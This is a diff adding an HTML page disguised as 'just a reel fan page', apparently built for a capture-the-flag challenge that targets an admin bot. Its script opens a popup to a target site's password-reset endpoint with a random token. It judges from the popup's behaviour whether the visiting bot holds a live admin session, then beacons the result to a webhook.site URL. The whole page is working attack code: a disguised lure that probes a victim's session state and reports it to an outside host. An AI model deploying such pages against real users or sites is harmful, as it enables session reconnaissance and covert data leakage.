@@ -1,0 +1,49 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>just a reel fan page</title>
+</head>
+<body>
+<script>
+'use strict';
+// ---- pool probe (single popup, zero admin-session cost beyond this visit) ----
+// Opens ONE popup with a surely-wrong random 32-hex token:
+//   admin cookie valid + wrong token -> POST 403 -> finish() -> +2s -> closes
+//   pool empty (login failed)        -> me() 401 -> redirect /login/ -> stays open
+// Verdict after 8s, beaconed (fire-and-forget survives context.close()).
+// alive=true  -> bot had a working admin session (pool NOT exhausted)
+// alive=false -> popup never closed  (pool exhausted, no cookie)
+const params = new URLSearchParams(location.search);
+const TARGET = (() => {
+  const t = params.get('t') || '';
+  return /^https:\/\/[a-z0-9.-]+$/i.test(t) ? t.replace(/\/+$/, '') : '';
+})();
+const REPORT = (() => {
+  const r = params.get('r') || '';
+  return /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(r)
+    ? 'https://webhook.site/' + r : '';
+})();
+
+function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }
+function beacon(data) {
+  if (!REPORT) return;
+  try {
+    navigator.sendBeacon(REPORT, new Blob([JSON.stringify({ t: new Date().toISOString(), ...data })], { type: 'text/plain' }));
+  } catch (e) { /* best effort */ }
+}
+
+(async () => {
+  if (!TARGET || !REPORT) return;
+  // random 32-hex: collision with the real token is impossible
+  const RAND = Array.from({ length: 32 }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
+  beacon({ event: 'probe-start', target: TARGET, token: RAND });
+  let w = null;
+  try { w = window.open(`${TARGET}/password/?token=${RAND}&password=probe`, '_blank'); } catch (e) { /* keep null */ }
+  await sleep(8000);
+  const verdict = !w ? 'null-window' : (w.closed ? 'alive' : 'dead');
+  beacon({ event: 'probe-result', verdict, token: RAND });
+})();
+</script>
+</body>
+</html>
